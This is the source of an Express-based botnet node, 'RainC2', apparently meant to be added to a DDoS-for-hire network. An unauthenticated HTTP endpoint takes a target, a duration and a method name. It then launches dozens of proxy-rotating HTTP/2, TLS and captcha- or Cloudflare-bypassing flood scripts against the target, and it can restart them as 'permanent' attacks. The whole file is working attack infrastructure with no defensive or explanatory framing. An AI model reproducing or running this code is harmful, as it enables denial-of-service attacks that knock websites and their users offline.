const express = require('express');
const { exec, spawn } = require('child_process');
const fs = require('fs');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5552;
const scrapeProxies = require('./proxy.js');

// Store running attack processes
const runningAttacks = new Map();
const permanentAttacks = new Map();

async function fetchData() {
  const response = await fetch('https://httpbin.org/get');
  const data = await response.json();
  console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
  return data;
}

function executeAttack(command, attackId) {
  const process = spawn('node', command.split(' ').slice(1));
  
  runningAttacks.set(attackId, process);
  
  process.on('exit', (code) => {
    runningAttacks.delete(attackId);
    
    // Restart if it's a permanent attack
    if (permanentAttacks.has(attackId)) {
      console.log(`Restarting permanent attack: ${attackId}`);
      const attackData = permanentAttacks.get(attackId);
      executeAttack(attackData.command, attackId);
    }
  });
  
  process.on('error', (err) => {
    console.error(`Attack process error: ${err}`);
    runningAttacks.delete(attackId);
  });
}

function stopAttack(attackId) {
  if (runningAttacks.has(attackId)) {
    const process = runningAttacks.get(attackId);
    process.kill('SIGTERM');
    runningAttacks.delete(attackId);
    permanentAttacks.delete(attackId);
    return true;
  }
  return false;
}

function stopAllAttacks() {
  let stoppedCount = 0;
  for (const [attackId] of runningAttacks) {
    if (stopAttack(attackId)) {
      stoppedCount++;
    }
  }
  return stoppedCount;
}

app.get('/RainC2', (req, res) => {
  const { target, time, methods, permanent } = req.query;
  
  if (!target || !time || !methods) {
    return res.status(400).json({ error: 'Missing required parameters' });
  }

  const attackId = `${methods}_${Date.now()}`;
  
  res.status(200).json({
    message: 'API request received. Executing script shortly.',
    target,
    time,
    methods,
    attackId,
    permanent: permanent === 'true'
  });

  // Execute attacks based on method
  const attackCommands = [];
  
  if (methods === 'HTTP-SICARIO') {
    attackCommands.push(
      `node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`,
      `node methods/cibi.js ${target} ${time} 16 3 proxy.txt`,
      `node methods/BYPASS.js ${target} ${time} 32 2 proxy.txt`,
      `node methods/nust.js ${target} ${time} 12 4 proxy.txt`,
      `node methods/Gravitus.js GET ${target} ${time} 90 10 proxy.txt --flood --http 2 --debug -full`,
      `node methods/rawcaptcha.js ${target} ${time} 5 5 6`,
      `node methods/cf.js ${target} ${time} 50 30`,
      `node methods/browser.js ${target} ${time} 5 4 6 proxy.txt`
    );
  } else if (methods === 'RAW-HTTP') {
    attackCommands.push(
      `node methods/h2-nust ${target} ${time} 15 2 proxy.txt`,
      `node methods/http-panel.js ${target} ${time}`,
      `node methods/cf.js ${target} ${time} 50 30`,
      `node methods/Gravitus.js GET ${target} ${time} 90 10 proxy.txt --flood --http 2 --debug -full`,
      `node methods/browser.js ${target} ${time} 5 4 6 proxy.txt`,
      `node methods/rawcaptcha.js ${target} ${time} 5 5 6`
    );
  } else if (methods === 'R9') {
    attackCommands.push(
      `node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`,
      `node methods/cf.js ${target} ${time} 50 30`,
      `node methods/nust.js ${target} ${time} 16 2 proxy.txt`,
      `node methods/h2blast.js ${target} ${time} 19 8 proxy.txt`,
      `node methods/Gravitus.js GET ${target} ${time} 90 10 proxy.txt --flood --http 2 --debug -full`,
      `node methods/h2-nust ${target} ${time} 15 2 proxy.txt`,
      `node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`,
      `node uam.js ${target} ${time} 5 4 6`,
      `node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`,
      `node methods/browser.js ${target} ${time} 5 4 6 proxy.txt`,
      `node methods/rawcaptcha.js ${target} ${time} 5 5 6`,
      `node methods/h2k.js GET ${target} ${time} 16 90 proxy.txt --randpath 1 --debug --cache --cookie "uh=good" --delay 1 --referer rand --postdata "user=f&pass=%RAND%" --authorization Bearer:abc123 --randrate --full --fakebot true --auth`,
      `node methods/CBROWSER.js ${target} ${time} 100 10 proxy.txt`,
      `node methods/kicker.js ${target} ${time} proxy.txt 90 15`,
      `node methods/tls.js ${target} ${time} 19 90 proxy.txt`,
      `node methods/wkill.js ${target} ${time}`
    );
  } else if (methods === 'PRIV-TOR') {
    attackCommands.push(
      `node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`,
      `node methods/cf.js ${target} ${time} 50 30`,
      `node methods/high-dstat.js ${target} ${time} 16 2 proxy.txt`,
      `node methods/cibi.js ${target} ${time} 12 4 proxy.txt`,
      `node methods/Gravitus.js GET ${target} ${time} 90 10 proxy.txt --flood --http 2 --debug -full`,
      `node methods/BYPASS.js ${target} ${time} 10 4 proxy.txt`,
      `node methods/nust.js ${target} ${time} 10 1 proxy.txt`,
      `node methods/rawcaptcha.js ${target} ${time} 5 5 6`
    );
  } else if (methods === 'HOLD-PANEL') {
    attackCommands.push(
      `node methods/http-panel.js ${target} ${time}`,
      `node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`,
      `node methods/cf.js ${target} ${time} 50 30`,
      `node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`,
      `node methods/rawcaptcha.js ${target} ${time} 5 5 6`,
      `node methods/Gravitus.js GET ${target} ${time} 90 10 proxy.txt --flood --http 2 --debug -full`,
      `node methods/h2blast.js ${target} ${time} 19 8 proxy.txt`
    );
  } else if (methods === 'R1') {
    attackCommands.push(
      `node methods/lovenet-flash.js ${target} ${time} 65 15 proxy.txt`,
      `node methods/lovenet-space.js ${target} ${time} 65 15 proxy.txt`,
      `node methods/lovenet-steven.js ${target} ${time} 65 15 proxy.txt`,
      `node methods/lovenet-death.js ${target} ${time} 65 15 proxy.txt`,
      `node methods/cf.js ${target} ${time} 50 30`,
      `node methods/browser.js ${target} ${time} 5 4 6 proxy.txt`,
      `node methods/rawcaptcha.js ${target} ${time} 5 5 6`,
      `node methods/Gravitus.js GET ${target} ${time} 90 10 proxy.txt --flood --http 2 --debug -full`,
      `node uam.js ${target} ${time} 5 4 6`,
      `node methods/h2blast.js ${target} ${time} 19 8 proxy.txt`,
      `node methods/lovenet-panel.js ${target} ${time} 65 15 proxy.txt`,
      `node methods/lovenet-panel2.js ${target} ${time} 65 15 proxy.txt`,
      `node methods/h2k.js GET ${target} ${time} 16 90 proxy.txt --randpath 1 --debug --cache --cookie "uh=good" --delay 1 --referer rand --postdata "user=f&pass=%RAND%" --authorization Bearer:abc123 --randrate --full --fakebot true --auth`,
      `node methods/CBROWSER.js ${target} ${time} 100 10 proxy.txt`,
      `node methods/kicker.js ${target} ${time} proxy.txt 90 15`,
      `node methods/tls.js ${target} ${time} 19 90 proxy.txt`,
      `node methods/wkill.js ${target} ${time}`
    );
  }

  // Execute all attack commands
  attackCommands.forEach((command, index) => {
    const cmdId = `${attackId}_${index}`;
    executeAttack(command, cmdId);
    
    // Store as permanent if requested
    if (permanent === 'true') {
      permanentAttacks.set(cmdId, { command, target, time, methods });
    }
  });

  console.log(`Attack started: ${methods} on ${target} for ${time} seconds`);
});

// Stop specific attack
app.get('/stop', (req, res) => {
  const { attackId } = req.query;
  
  if (!attackId) {
    return res.status(400).json({ error: 'Attack ID required' });
  }
  
  const stopped = stopAttack(attackId);
  
  res.json({
    message: stopped ? 'Attack stopped successfully' : 'Attack not found or already stopped',
    attackId
  });
});

// Stop all attacks
app.get('/stopall', (req, res) => {
  const stoppedCount = stopAllAttacks();
  
  res.json({
    message: `Stopped ${stoppedCount} attacks`,
    stoppedCount
  });
});

// List running attacks
app.get('/status', (req, res) => {
  const running = Array.from(runningAttacks.keys());
  const permanent = Array.from(permanentAttacks.keys());
  
  res.json({
    runningAttacks: running,
    permanentAttacks: permanent,
    totalRunning: running.length,
    totalPermanent: permanent.length
  });
});

// Remove permanent attack
app.get('/remove-permanent', (req, res) => {
  const { attackId } = req.query;
  
  if (!attackId) {
    return res.status(400).json({ error: 'Attack ID required' });
  }
  
  const removed = permanentAttacks.delete(attackId);
  if (removed) {
    stopAttack(attackId);
  }
  
  res.json({
    message: removed ? 'Permanent attack removed' : 'Permanent attack not found',
    attackId
  });
});

app.listen(port, () => {
  fetchData();
  console.log(`RainC2 server running on port ${port}`);
});